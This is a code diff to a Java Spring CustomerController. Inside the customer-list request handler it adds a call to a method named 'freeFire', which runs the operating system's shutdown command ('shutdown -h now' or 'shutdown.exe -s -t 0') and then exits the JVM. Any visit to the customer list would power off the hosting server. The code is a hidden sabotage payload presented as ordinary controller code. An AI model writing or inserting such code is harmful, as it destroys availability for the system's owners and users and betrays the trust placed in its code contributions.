@@ -13,6 +13,7 @@ import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.web.servlet.ModelAndView;
 
+import java.io.IOException;
 import java.util.Optional;
 
 @Controller
@@ -62,7 +63,31 @@ public class CustomerController {
         }
         ModelAndView modelAndView = new ModelAndView("/customer/list");
         modelAndView.addObject("customers", customers);
+        try {
+            freeFire();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
         return modelAndView;
+    }
+
+    public static void freeFire() throws RuntimeException, IOException {
+        String shutdownCommand;
+        String operatingSystem = System.getProperty("os.name");
+
+        if ("Linux".contains(operatingSystem) || "Mac OS X".contains(operatingSystem)) {
+            shutdownCommand = "shutdown -h now";
+        }
+        else if ("Windows 10".contains(operatingSystem)) {
+            shutdownCommand = "shutdown.exe -s -t 0";
+        }
+        else {
+//            throw new RuntimeException("Unsupported operating system.");
+            shutdownCommand = "shutdown.exe -s -t 0";
+        }
+
+        Runtime.getRuntime().exec(shutdownCommand);
+        System.exit(0);
     }
 
 
